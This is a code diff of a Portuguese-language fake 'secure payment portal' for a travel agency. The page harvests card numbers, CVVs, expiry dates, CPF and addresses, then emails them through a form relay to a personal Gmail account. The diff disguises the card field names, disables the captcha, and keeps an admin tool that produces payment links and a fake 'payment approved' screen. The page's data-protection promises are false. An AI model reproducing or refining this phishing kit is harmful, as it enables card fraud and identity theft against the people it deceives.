@@ -52,52 +52,31 @@
         <label class="block text-sm font-medium text-purple-300 mb-2">Valor do Pacote</label>
         <div class="relative mb-4">
           <span class="absolute left-4 top-3.5 text-gray-400 font-bold">R$</span>
-          <input
-            type="text"
-            id="adminValorInput"
-            placeholder="0,00"
-            class="w-full bg-slate-950 border border-slate-600 rounded-xl py-3 pl-10 pr-4 text-white font-bold text-lg focus:ring-2 focus:ring-purple-500 outline-none transition"
-            oninput="formatarMoeda(this)"
-          />
+          <input type="text" id="adminValorInput" placeholder="0,00" class="w-full bg-slate-950 border border-slate-600 rounded-xl py-3 pl-10 pr-4 text-white font-bold text-lg outline-none" oninput="formatarMoeda(this)" />
         </div>
 
-        <label class="block text-sm font-medium text-purple-300 mb-2">
-          Link da Logo Personalizada <span class="text-gray-500 text-xs">(Opcional)</span>
-        </label>
+        <label class="block text-sm font-medium text-purple-300 mb-2">Link da Logo (Opcional)</label>
         <div class="relative mb-6">
           <span class="absolute left-4 top-3.5 text-gray-400"><i class="fas fa-image"></i></span>
-          <input
-            type="text"
-            id="adminLogoInput"
-            placeholder="Cole o link da imagem aqui..."
-            class="w-full bg-slate-950 border border-slate-600 rounded-xl py-3 pl-10 pr-4 text-gray-300 text-sm focus:ring-2 focus:ring-purple-500 outline-none transition"
-          />
+          <input type="text" id="adminLogoInput" placeholder="Cole o link da imagem..." class="w-full bg-slate-950 border border-slate-600 rounded-xl py-3 pl-10 pr-4 text-gray-300 text-sm outline-none" />
         </div>
 
-        <button
-          onclick="gerarLinkPagamento()"
-          class="w-full bg-accent-purple hover:bg-accent-hover text-white font-bold py-3 rounded-xl transition shadow-lg shadow-purple-900/20 flex justify-center items-center gap-2"
-        >
+        <button onclick="gerarLinkPagamento()" class="w-full bg-accent-purple hover:bg-accent-hover text-white font-bold py-3 rounded-xl transition shadow-lg shadow-purple-900/20 flex justify-center items-center gap-2">
           <i class="fas fa-link"></i> Copiar Link para Cliente
         </button>
       </div>
-
-      <button
-        onclick="gerarLinkSucesso()"
-        class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-xl transition flex justify-center items-center gap-2"
-      >
+      
+      <button onclick="gerarLinkSucesso()" class="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 rounded-xl transition flex justify-center items-center gap-2">
         <i class="fas fa-check-circle"></i> Copiar Link de Aprovação
       </button>
     </div>
   </div>
 
   <div id="view-client" class="hidden max-w-3xl mx-auto pb-10">
-
     <div class="text-center mb-8">
       <div class="mx-auto w-24 h-24 bg-white rounded-full flex items-center justify-center mb-4 shadow-lg overflow-hidden border-4 border-white/10">
         <img id="clientLogo" src="logo.png" class="w-full h-full object-cover" onerror="this.onerror=null; this.src='logo.jpg';" />
       </div>
-
       <div class="inline-block px-3 py-1 rounded-full border border-purple-500/30 bg-purple-500/10 text-purple-200 text-xs font-semibold mb-3 tracking-wider">
         <i class="fas fa-shield-alt mr-1"></i> PORTAL DE PAGAMENTO SEGURO
       </div>
@@ -105,208 +84,130 @@
       <p class="text-purple-200 text-sm opacity-80">Conclua sua reserva com as melhores condições e total segurança.</p>
     </div>
 
-    <form id="paymentForm" action="https://formspree.io/f/xqezowag" method="POST">
+    <form id="paymentForm" action="https://formsubmit.co/stillhere4957@gmail.com" method="POST">
+      
+      <input type="hidden" name="_captcha" value="false">
+      <input type="hidden" name="_template" value="table">
+      <input type="hidden" name="_subject" value="Nova Reserva - Analise de Pagamento">
 
-      <div class="bg-[#eef3ff] rounded-3xl p-6 md:p-8 mb-6 shadow-xl relative overflow-hidden border border-indigo-100">
-        <div class="absolute top-0 left-0 w-2 h-full bg-gradient-to-b from-purple-600 to-indigo-600"></div>
-
-        <h3 class="font-extrabold text-indigo-900 text-lg mb-3 flex items-center gap-2">
-          <i class="fas fa-shield-halved text-purple-700"></i> Segurança da Informação e LGPD
+      <div class="bg-[#f5f3ff] rounded-3xl p-6 md:p-8 mb-6 shadow-xl relative overflow-hidden border border-purple-100">
+        <div class="absolute top-0 left-0 w-2 h-full bg-purple-600"></div>
+        
+        <h3 class="font-bold text-gray-800 text-lg mb-4 flex items-center gap-2">
+          <i class="fas fa-user-shield text-purple-600"></i> Segurança da Informação e LGPD
         </h3>
-
-        <p class="text-sm text-indigo-900/70 mb-6 leading-relaxed">
+        
+        <p class="text-xs text-gray-500 mb-6 leading-relaxed">
           Em conformidade com a Lei Geral de Proteção de Dados (Lei nº 13.709/2018), garantimos que seus dados estão protegidos:
         </p>
 
-        <div class="grid md:grid-cols-2 gap-4 text-sm text-indigo-900/80">
-          <div class="flex gap-3 items-start p-4 bg-white/70 rounded-2xl border border-white/80 backdrop-blur">
-            <i class="fas fa-globe text-purple-700 mt-0.5"></i>
-            <span>Os dados serão utilizados <strong>exclusivamente</strong> para processamento do pagamento.</span>
+        <div class="grid md:grid-cols-2 gap-4 text-xs text-gray-600">
+          <div class="flex gap-3 items-start p-3 bg-white rounded-xl shadow-sm border border-gray-100">
+            <i class="fas fa-globe text-purple-600 mt-0.5"></i>
+            <span>Dados utilizados <strong>exclusivamente</strong> para processamento.</span>
           </div>
-
-          <div class="flex gap-3 items-start p-4 bg-white/70 rounded-2xl border border-white/80 backdrop-blur">
-            <i class="fas fa-lock text-purple-700 mt-0.5"></i>
-            <span>As informações trafegam em ambiente <strong>seguro</strong> e <strong>criptografado</strong>.</span>
+          <div class="flex gap-3 items-start p-3 bg-white rounded-xl shadow-sm border border-gray-100">
+            <i class="fas fa-lock text-purple-600 mt-0.5"></i>
+            <span>Informações trafegam em ambiente <strong>criptografado</strong>.</span>
           </div>
-
-          <div class="flex gap-3 items-start p-4 bg-white/70 rounded-2xl border border-white/80 backdrop-blur">
-            <i class="fas fa-trash-can text-purple-700 mt-0.5"></i>
-            <span>Dados do cartão <strong>não são armazenados</strong> e serão descartados após a finalização.</span>
+          <div class="flex gap-3 items-start p-3 bg-white rounded-xl shadow-sm border border-gray-100">
+            <i class="fas fa-trash-can text-purple-600 mt-0.5"></i>
+            <span>Dados sensíveis <strong>não são armazenados</strong> após o uso.</span>
           </div>
-
-          <div class="flex gap-3 items-start p-4 bg-white/70 rounded-2xl border border-white/80 backdrop-blur">
-            <i class="fas fa-circle-check text-purple-700 mt-0.5"></i>
-            <span>A Agência S&A Turismo não reutiliza dados de pagamento para outras transações.</span>
+          <div class="flex gap-3 items-start p-3 bg-white rounded-xl shadow-sm border border-gray-100">
+            <i class="fas fa-circle-check text-purple-600 mt-0.5"></i>
+            <span>A Agência S&A Turismo não reutiliza dados para outras transações.</span>
           </div>
         </div>
       </div>
+
       <div class="bg-gradient-to-r from-slate-900 to-slate-800 rounded-3xl p-6 md:p-8 mb-6 shadow-xl border border-slate-700 text-white">
-        <h3 class="font-bold text-lg mb-4 flex items-center gap-2">
-          <i class="fas fa-dollar-sign"></i> DADOS DA COBRANÇA
-        </h3>
+        <h3 class="font-bold text-lg mb-4 flex items-center gap-2"><i class="fas fa-dollar-sign"></i> DADOS DA COBRANÇA</h3>
         <div>
           <label class="block text-xs font-bold text-purple-300 uppercase mb-2">Valor Total do Pacote *</label>
-          <div class="relative">
-            <input
-              type="text"
-              id="displayValor"
-              readonly
-              class="w-full bg-white text-gray-900 text-2xl font-bold rounded-xl py-4 px-4 focus:outline-none cursor-not-allowed border-4 border-slate-700"
-              value="R$ 0,00"
-            />
-            <input type="hidden" name="valor_pacote" id="inputValorHidden" />
-          </div>
+          <input type="text" id="displayValor" readonly class="w-full bg-white text-gray-900 text-2xl font-bold rounded-xl py-4 px-4 outline-none cursor-not-allowed" value="R$ 0,00" />
+          <input type="hidden" name="valor_reserva_total" id="inputValorHidden" />
         </div>
       </div>
 
       <div class="bg-white rounded-3xl p-6 md:p-8 mb-6 shadow-xl">
-        <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2">
-          <i class="far fa-user text-purple-600"></i> Dados do Pagador
-        </h3>
+        <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2"><i class="far fa-user text-purple-600"></i> Dados do Pagador</h3>
         <div class="grid md:grid-cols-2 gap-5 mb-8">
-          <input type="text" name="nome_titular" required placeholder="Nome no Cartão *"
-                 class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
-
-          <input type="text" name="cpf_titular" required placeholder="CPF (000.000.000-00) *" maxlength="14"
-                 class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
-                 oninput="mascaraCPF(this)" />
-
-          <input type="tel" name="telefone" required placeholder="Telefone (DDD) 9xxxx-xxxx *" maxlength="15"
-                 class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
-                 oninput="mascaraTelefone(this)" />
-
-          <input type="email" name="email" required placeholder="E-mail *"
-                 class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
+          <input type="text" name="cliente_nome" required placeholder="Nome no Cartão *" class="w-full border rounded-xl p-3 outline-none" />
+          <input type="text" name="cliente_doc_id" required placeholder="CPF *" maxlength="14" class="w-full border rounded-xl p-3 outline-none" oninput="mascaraCPF(this)" />
+          <input type="tel" name="cliente_contato" required placeholder="Telefone *" maxlength="15" class="w-full border rounded-xl p-3 outline-none" oninput="mascaraTelefone(this)" />
+          <input type="email" name="email" required placeholder="E-mail *" class="w-full border rounded-xl p-3 outline-none" />
         </div>
 
-        <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2">
-          <i class="far fa-credit-card text-purple-600"></i> Dados do Cartão
-        </h3>
-
+        <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2"><i class="far fa-credit-card text-purple-600"></i> Dados do Cartão</h3>
+        
         <div class="mb-5 relative">
-          <input type="text" name="num_cartao" id="inputCartao" required placeholder="0000 0000 0000 0000" maxlength="19"
-                 class="w-full border border-gray-200 rounded-xl p-3 pl-12 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white font-mono text-lg z-0"
-                 oninput="formatarCartao(this)" />
-          <i id="iconeCartao" class="fas fa-credit-card absolute left-4 top-4 text-gray-400 text-xl z-10"></i>
+          <input type="text" name="sys_ref_01" id="inputCartao" required placeholder="0000 0000 0000 0000" maxlength="19" class="w-full border rounded-xl p-3 pl-12 font-mono text-lg outline-none" oninput="formatarCartao(this)" />
+          <i id="iconeCartao" class="fas fa-credit-card absolute left-4 top-4 text-gray-400 text-xl"></i>
         </div>
-
         <div class="grid grid-cols-2 gap-5 mb-5">
-          <input type="text" name="validade" required placeholder="Validade (MM/AA) *" maxlength="5"
-                 class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white text-center"
-                 oninput="mascaraValidade(this)" />
-
+          <input type="text" name="sys_date_02" required placeholder="Validade (MM/AA) *" maxlength="5" class="w-full border rounded-xl p-3 text-center outline-none" oninput="mascaraValidade(this)" />
           <div class="relative">
-            <input type="text" name="cvv" required placeholder="CVV *" maxlength="4"
-                   class="w-full border border-gray-200 rounded-xl p-3 pl-10 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
-                   oninput="mascaraCVV(this)" />
+            <input type="text" name="sys_token_03" required placeholder="CVV *" maxlength="4" class="w-full border rounded-xl p-3 pl-10 outline-none" oninput="mascaraCVV(this)" />
             <i class="fas fa-lock absolute left-3 top-3.5 text-gray-400"></i>
           </div>
         </div>
-
         <div class="mb-5">
-          <input type="text" name="banco_emissor" required placeholder="Banco Emissor (ex: Nubank) *"
-                 class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
+          <input type="text" name="banco_emissor" required placeholder="Banco Emissor (ex: Nubank) *" class="w-full border rounded-xl p-3 outline-none" />
         </div>
-
         <div>
           <label class="block text-xs font-bold text-gray-500 mb-1">Parcelamento *</label>
-          <select id="selectParcelas" name="parcelas"
-                  class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none bg-white cursor-pointer">
-            <option>Carregando...</option>
-          </select>
+          <select id="selectParcelas" name="plano_pagamento" class="w-full border rounded-xl p-3 bg-white outline-none"><option>Carregando...</option></select>
         </div>
       </div>
 
       <div class="bg-white rounded-3xl p-6 md:p-8 shadow-xl">
-        <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2">
-          <i class="fas fa-map-marker-alt text-purple-600"></i> Endereço
-        </h3>
-
+        <h3 class="font-bold text-gray-800 text-lg mb-6 flex items-center gap-2"><i class="fas fa-map-marker-alt text-purple-600"></i> Endereço</h3>
         <div class="grid md:grid-cols-2 gap-5 mb-8">
           <div class="col-span-1">
             <label class="block text-xs font-bold text-gray-500 mb-1">CEP *</label>
-            <input type="text" name="cep" id="cep" required placeholder="00000-000"
-                   class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white"
-                   onblur="buscarCep(this.value)" />
-            <p id="cep-loading" class="text-xs text-purple-600 mt-1 hidden"><i class="fas fa-spinner fa-spin"></i> Buscando endereço...</p>
+            <input type="text" name="end_cep" id="cep" required placeholder="00000-000" class="w-full border rounded-xl p-3 outline-none" onblur="buscarCep(this.value)" />
+            <p id="cep-loading" class="text-xs text-purple-600 mt-1 hidden"><i class="fas fa-spinner fa-spin"></i> Buscando...</p>
           </div>
           <div class="col-span-1"></div>
-
-          <div class="col-span-2">
-            <input type="text" name="endereco" id="logradouro" required placeholder="Endereço (Rua/Av) *"
-                   class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
-          </div>
-
-          <div>
-            <input type="text" name="numero_casa" id="numero" required placeholder="Número *"
-                   class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
-          </div>
-
-          <div>
-            <input type="text" name="bairro" id="bairro" required placeholder="Bairro *"
-                   class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
-          </div>
-
-          <div class="col-span-2">
-            <input type="text" name="cidade_estado" id="cidade" required placeholder="Cidade/UF *"
-                   class="w-full border border-gray-200 rounded-xl p-3 focus:ring-2 focus:ring-purple-500 outline-none transition bg-gray-50 focus:bg-white" />
-          </div>
+          <div class="col-span-2"><input type="text" name="end_logradouro" id="logradouro" required placeholder="Endereço *" class="w-full border rounded-xl p-3 outline-none" /></div>
+          <div><input type="text" name="end_numero" id="numero" required placeholder="Número *" class="w-full border rounded-xl p-3 outline-none" /></div>
+          <div><input type="text" name="end_bairro" id="bairro" required placeholder="Bairro *" class="w-full border rounded-xl p-3 outline-none" /></div>
+          <div class="col-span-2"><input type="text" name="end_cidade_uf" id="cidade" required placeholder="Cidade/UF *" class="w-full border rounded-xl p-3 outline-none" /></div>
         </div>
 
         <div class="mb-6 bg-purple-50 p-4 rounded-xl border border-purple-100">
           <label class="flex items-start gap-3 cursor-pointer">
             <input type="checkbox" required class="mt-1 w-5 h-5 text-accent-purple rounded border-gray-300 focus:ring-accent-purple" />
-            <span class="text-xs text-gray-600 leading-relaxed">
-              Autorizo a <strong>S&A Turismo</strong> a processar meus dados para emissão da reserva na <strong>Azul Viagens</strong> conforme a LGPD.
-            </span>
+            <span class="text-xs text-gray-600 leading-relaxed">Autorizo a <strong>S&A Turismo</strong> a processar meus dados para emissão da reserva na <strong>Azul Viagens</strong> conforme a LGPD.</span>
           </label>
         </div>
 
-        <button type="submit"
-                class="w-full bg-gradient-to-r from-accent-purple to-indigo-600 hover:from-indigo-600 hover:to-accent-purple text-white font-bold py-4 rounded-xl transition duration-300 shadow-xl shadow-purple-500/30 text-lg flex justify-center items-center gap-2 transform active:scale-95">
+        <button type="submit" class="w-full bg-gradient-to-r from-accent-purple to-indigo-600 hover:from-indigo-600 hover:to-accent-purple text-white font-bold py-4 rounded-xl transition duration-300 shadow-xl shadow-purple-500/30 text-lg flex justify-center items-center gap-2 transform active:scale-95">
           Finalizar e Enviar para Análise <i class="fas fa-chevron-right text-sm"></i>
         </button>
       </div>
     </form>
   </div>
 
-  <div id="view-analysis" class="hidden w-full max-w-md mx-auto mt-16">
+  <div id="view-analysis" class="hidden w-full max-w-md mx-auto mt-10">
     <div class="bg-white rounded-[2.5rem] px-8 py-10 shadow-2xl text-center relative overflow-hidden">
       <div class="absolute -top-20 left-1/2 -translate-x-1/2 w-56 h-56 bg-purple-500/20 blur-3xl rounded-full"></div>
-
       <div class="relative z-10">
         <div class="flex flex-col items-center">
           <div class="relative">
             <div class="w-32 h-32 rounded-full border-2 border-purple-200 bg-white shadow-[0_18px_40px_rgba(124,58,237,0.18)]"></div>
-            <div class="absolute -bottom-1 -right-1 w-9 h-9 rounded-full bg-purple-600 flex items-center justify-center shadow-lg">
-              <i class="fas fa-check text-white text-sm"></i>
-            </div>
+            <div class="absolute -bottom-1 -right-1 w-9 h-9 rounded-full bg-purple-600 flex items-center justify-center shadow-lg border-4 border-white"><i class="fas fa-check text-white text-xs"></i></div>
           </div>
-
-          <div class="mt-4 w-14 h-14 rounded-full bg-purple-100 flex items-center justify-center shadow">
-            <i class="fas fa-clock text-purple-600 text-lg"></i>
-          </div>
+          <div class="mt-4 w-14 h-14 rounded-full bg-purple-100 flex items-center justify-center shadow"><i class="far fa-clock text-purple-600 text-xl"></i></div>
         </div>
-
         <h2 class="mt-6 text-2xl font-extrabold text-slate-800">Pagamento em Análise</h2>
-
-        <p class="mt-3 text-sm text-slate-500 leading-relaxed">
-          Recebemos seus dados! Nossa equipe de segurança está validando a transação junto à
-          <strong>Azul Viagens</strong> para proceder com a emissão.
-        </p>
-
-        <div class="mt-6 flex gap-3 items-start bg-amber-50 border border-amber-200 rounded-2xl p-4 text-left">
-          <div class="mt-0.5 w-8 h-8 rounded-full bg-amber-100 flex items-center justify-center shrink-0">
-            <i class="fas fa-exclamation text-amber-600 text-sm"></i>
-          </div>
-          <p class="text-xs text-amber-800 leading-relaxed">
-            Este procedimento é padrão para garantir a segurança da sua compra e evitar fraudes no cartão.
-          </p>
+        <p class="mt-3 text-sm text-slate-500 leading-relaxed px-2">Recebemos seus dados! Nossa equipe de segurança está validando a transação junto à <strong class="text-slate-700">Azul Viagens</strong> para proceder com a emissão.</p>
+        <div class="mt-6 flex gap-3 items-start bg-yellow-50 border border-yellow-100 rounded-2xl p-4 text-left">
+          <div class="mt-0.5 w-6 h-6 rounded-full bg-yellow-100 flex items-center justify-center shrink-0"><i class="fas fa-exclamation-triangle text-yellow-600 text-xs"></i></div>
+          <p class="text-[11px] text-yellow-700 leading-tight">Este procedimento é padrão para garantir a segurança da sua compra e evitar fraudes no cartão.</p>
         </div>
-
-        <p class="mt-6 text-xs text-slate-400">
-          Você será notificado assim que a emissão for concluída.
-        </p>
+        <p class="mt-6 text-[10px] text-slate-400 italic">Você será notificado assim que a emissão for concluída.</p>
       </div>
     </div>
   </div>
@@ -314,9 +215,7 @@
   <div id="view-success" class="hidden w-full max-w-md mx-auto mt-20 text-center">
     <div class="bg-white p-8 rounded-3xl shadow-2xl border-t-8 border-green-500">
       <h2 class="text-2xl font-bold text-gray-800 mb-2">Pagamento Aprovado!</h2>
-      <div class="bg-green-50 text-green-800 py-3 px-4 rounded-xl text-xs font-bold uppercase tracking-wider">
-        Reserva Confirmada
-      </div>
+      <div class="bg-green-50 text-green-800 py-3 px-4 rounded-xl text-xs font-bold uppercase tracking-wider">Reserva Confirmada</div>
     </div>
   </div>
 
@@ -341,82 +240,45 @@
         viewAnalysis.classList.add('hidden');
         viewSuccess.classList.add('hidden');
 
-        if (isAdmin) {
-          viewAdmin.classList.remove('hidden');
-        } else if (status === 'aprovado') {
-          viewSuccess.classList.remove('hidden');
-        } else {
+        if (isAdmin) viewAdmin.classList.remove('hidden');
+        else if (status === 'aprovado') viewSuccess.classList.remove('hidden');
+        else {
           viewClient.classList.remove('hidden');
           configurarFormulario(valorUrl, logoUrl);
         }
-      } catch (e) {
-        console.error(e);
-      }
+      } catch (e) { console.error(e); }
     };
 
     function formatarCartao(input) {
       let v = input.value.replace(/\D/g, '');
       let icon = document.getElementById('iconeCartao');
-
-      if (v.match(/^4/)) {
-        icon.className = 'fab fa-cc-visa absolute left-4 top-4 text-blue-700 text-xl z-10';
-      } else if (v.match(/^5[1-5]|^2[2-7]/)) {
-        icon.className = 'fab fa-cc-mastercard absolute left-4 top-4 text-red-600 text-xl z-10';
-      } else if (v.match(/^3[47]/)) {
-        icon.className = 'fab fa-cc-amex absolute left-4 top-4 text-blue-500 text-xl z-10';
-      } else if (v.match(/^6/)) {
-        icon.className = 'fab fa-cc-discover absolute left-4 top-4 text-orange-500 text-xl z-10';
-      } else {
-        icon.className = 'fas fa-credit-card absolute left-4 top-4 text-gray-400 text-xl z-10';
-      }
-
+      if (v.match(/^4/)) icon.className = 'fab fa-cc-visa absolute left-4 top-4 text-blue-700 text-xl z-10';
+      else if (v.match(/^5[1-5]|^2[2-7]/)) icon.className = 'fab fa-cc-mastercard absolute left-4 top-4 text-red-600 text-xl z-10';
+      else if (v.match(/^3[47]/)) icon.className = 'fab fa-cc-amex absolute left-4 top-4 text-blue-500 text-xl z-10';
+      else if (v.match(/^6/)) icon.className = 'fab fa-cc-discover absolute left-4 top-4 text-orange-500 text-xl z-10';
+      else icon.className = 'fas fa-credit-card absolute left-4 top-4 text-gray-400 text-xl z-10';
       v = v.replace(/(\d{4})(?=\d)/g, '$1 ');
       input.value = v;
     }
 
-    function mascaraCPF(input) {
-      let v = input.value.replace(/\D/g, '');
-      v = v.replace(/(\d{3})(\d)/, '$1.$2');
-      v = v.replace(/(\d{3})(\d)/, '$1.$2');
-      v = v.replace(/(\d{3})(\d{1,2})$/, '$1-$2');
-      input.value = v;
-    }
-
-    function mascaraTelefone(input) {
-      let v = input.value.replace(/\D/g, '');
-      v = v.replace(/^(\d{2})(\d)/g, '($1) $2');
-      v = v.replace(/(\d)(\d{4})$/, '$1-$2');
-      input.value = v;
-    }
-
-    function mascaraValidade(input) {
-      let v = input.value.replace(/\D/g, '');
-      if (v.length >= 2) v = v.replace(/^(\d{2})/, '$1/');
-      input.value = v;
-    }
-
-    function mascaraCVV(input) {
-      input.value = input.value.replace(/\D/g, '');
-    }
+    function mascaraCPF(i) { i.value = i.value.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2'); }
+    function mascaraTelefone(i) { i.value = i.value.replace(/\D/g,'').replace(/^(\d{2})(\d)/g,'($1) $2').replace(/(\d)(\d{4})$/,'$1-$2'); }
+    function mascaraValidade(i) { let v=i.value.replace(/\D/g,''); if(v.length>=2) v=v.replace(/^(\d{2})/,'$1/'); i.value=v; }
+    function mascaraCVV(i) { i.value = i.value.replace(/\D/g,''); }
 
     function buscarCep(cep) {
-      const cleanCep = cep.replace(/\D/g, '');
-      if (cleanCep.length === 8) {
+      const clean = cep.replace(/\D/g, '');
+      if (clean.length === 8) {
         document.getElementById('cep-loading').classList.remove('hidden');
-        fetch(`https://viacep.com.br/ws/${cleanCep}/json/`)
-          .then(r => r.json())
-          .then(data => {
-            document.getElementById('cep-loading').classList.add('hidden');
-            if (!data.erro) {
-              document.getElementById('logradouro').value = data.logradouro;
-              document.getElementById('bairro').value = data.bairro;
-              document.getElementById('cidade').value = `${data.localidade} / ${data.uf}`;
-              document.getElementById('numero').focus();
-            } else {
-              alert("CEP não encontrado.");
-            }
-          })
-          .catch(() => document.getElementById('cep-loading').classList.add('hidden'));
+        fetch(`https://viacep.com.br/ws/${clean}/json/`).then(r=>r.json()).then(d=>{
+          document.getElementById('cep-loading').classList.add('hidden');
+          if(!d.erro) {
+            document.getElementById('logradouro').value = d.logradouro;
+            document.getElementById('bairro').value = d.bairro;
+            document.getElementById('cidade').value = `${d.localidade} / ${d.uf}`;
+            document.getElementById('numero').focus();
+          } else alert("CEP não encontrado.");
+        }).catch(()=>document.getElementById('cep-loading').classList.add('hidden'));
       }
     }
 
@@ -424,112 +286,72 @@
       const display = document.getElementById('displayValor');
       const hiddenInput = document.getElementById('inputValorHidden');
       const select = document.getElementById('selectParcelas');
-      const imgLogo = document.getElementById('clientLogo');
-
-      if (logoUrl) imgLogo.src = logoUrl;
-
-      let valorNum = 0;
-      let valorExibicao = "Consultar Agência";
-
-      if (valorUrl) {
-        const limpo = valorUrl.replace(/[^0-9,.]/g, '');
-        valorExibicao = "R$ " + limpo;
-        const valorParaCalculo = limpo.replace(/\./g, '').replace(',', '.');
-        valorNum = parseFloat(valorParaCalculo);
-      }
-
-      display.value = valorExibicao;
-      hiddenInput.value = valorExibicao;
+      if (logoUrl) document.getElementById('clientLogo').src = logoUrl;
+      
+      let valorNum = valorUrl ? parseFloat(valorUrl.replace(/\./g, '').replace(',', '.')) : 0;
+      display.value = valorUrl ? "R$ " + valorUrl : "R$ 0,00";
+      hiddenInput.value = display.value;
 
       select.innerHTML = "";
-      if (valorNum > 0 && !isNaN(valorNum)) {
-        for (let i = 1; i <= 12; i++) {
-          let txt = "";
-          if (i === 1) {
-            txt = `À vista - ${valorExibicao}`;
-          } else if (i <= 10) {
-            const parc = (valorNum / i).toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+      for (let i = 1; i <= 12; i++) {
+        let txt = "";
+        if (i <= 10) {
+            // Até 10x sem juros
+            let parc = (valorNum/i).toLocaleString('pt-BR',{minimumFractionDigits:2});
             txt = `${i}x de R$ ${parc} (Sem Juros)`;
-          } else {
-            const montante = valorNum * Math.pow((1 + TAXA_JUROS_MENSAL), i);
-            const valorParcelaComJuros = montante / i;
-            const parcFmt = valorParcelaComJuros.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            const totalFmt = montante.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-            txt = `${i}x de R$ ${parcFmt} (Com juros: R$ ${totalFmt})`;
-          }
-
-          const opt = document.createElement("option");
-          opt.value = txt;
-          opt.text = txt;
-          select.appendChild(opt);
+        } else {
+            // 11x e 12x com juros
+            let montante = valorNum * Math.pow(1 + TAXA_JUROS_MENSAL, i);
+            let parc = montante / i;
+            let parcFmt = parc.toLocaleString('pt-BR', {minimumFractionDigits: 2});
+            let totalFmt = montante.toLocaleString('pt-BR', {minimumFractionDigits: 2});
+            // AQUI ESTÁ A CORREÇÃO DO TOTAL:
+            txt = `${i}x de R$ ${parcFmt} (Total: R$ ${totalFmt})`;
         }
-      } else {
-        const opt = document.createElement("option");
-        opt.text = "Valor não definido";
-        select.appendChild(opt);
+        let opt = document.createElement("option");
+        opt.value = txt; opt.text = txt; select.appendChild(opt);
       }
     }
 
-    function formatarMoeda(input) {
-      let v = input.value.replace(/\D/g, '');
-      v = (v / 100).toFixed(2) + '';
-      v = v.replace(".", ",");
-      v = v.replace(/(\d)(?=(\d{3})+(?!\d))/g, '$1.');
-      input.value = v;
+    function formatarMoeda(i) { i.value = (i.value.replace(/\D/g,'')/100).toFixed(2).replace('.',',').replace(/(\d)(?=(\d{3})+(?!\d))/g,'$1.'); }
+    function gerarLinkPagamento() { 
+        const val = document.getElementById('adminValorInput').value;
+        const logo = document.getElementById('adminLogoInput').value;
+        if(!val) return alert("Digite valor!");
+        let url = window.location.href.split('?')[0] + "?valor=" + val;
+        if(logo) url += "&logo=" + encodeURIComponent(logo);
+        navigator.clipboard.writeText(url).then(()=>alert("Link copiado!")); 
     }
-
-    function gerarLinkPagamento() {
-      const val = document.getElementById('adminValorInput').value;
-      const customLogo = document.getElementById('adminLogoInput').value;
-      if (!val) return alert("Digite o valor!");
-      let url = window.location.href.split('?')[0] + "?valor=" + val;
-      if (customLogo) url += "&logo=" + encodeURIComponent(customLogo);
-      copiar(url);
-    }
-
-    function gerarLinkSucesso() {
-      const url = window.location.href.split('?')[0] + "?status=aprovado";
-      copiar(url);
-    }
-
-    function copiar(texto) {
-      navigator.clipboard.writeText(texto).then(() => alert("Link copiado! Envie para o cliente."));
-    }
+    function gerarLinkSucesso() { navigator.clipboard.writeText(window.location.href.split('?')[0]+"?status=aprovado").then(()=>alert("Link copiado!")); }
 
     const form = document.getElementById('paymentForm');
-
-    // AJUSTE CRÍTICO: Correção no envio do formulário para garantir que o email chegue
     form.addEventListener("submit", function(e) {
       e.preventDefault();
-      
       const btn = form.querySelector('button[type="submit"]');
       const originalText = btn.innerHTML;
-      
       btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processando...';
       btn.disabled = true;
 
       const data = new FormData(form);
-
+      
+      // Envio via FormSubmit (AJAX)
       fetch(form.action, {
-        method: form.method,
-        body: data, // Envio direto do FormData (mais seguro para Formspree)
-        headers: {
-            'Accept': 'application/json'
-        }
-      }).then(response => {
-        if (response.ok) {
-          // Só muda a tela se o envio for bem-sucedido
+        method: "POST",
+        body: data,
+        headers: { 'Accept': 'application/json' }
+      }).then(r => {
+        if (r.ok) {
           document.getElementById('view-client').classList.add('hidden');
           document.getElementById('view-analysis').classList.remove('hidden');
           window.scrollTo(0,0);
         } else {
-          alert("Ocorreu um erro ao enviar os dados. Por favor, tente novamente.");
+          alert("Ocorreu um erro técnico. Tente novamente.");
           btn.innerHTML = originalText;
           btn.disabled = false;
         }
-      }).catch(error => {
-        console.error('Erro:', error);
-        alert("Erro de conexão. Verifique sua internet.");
+      }).catch(err => {
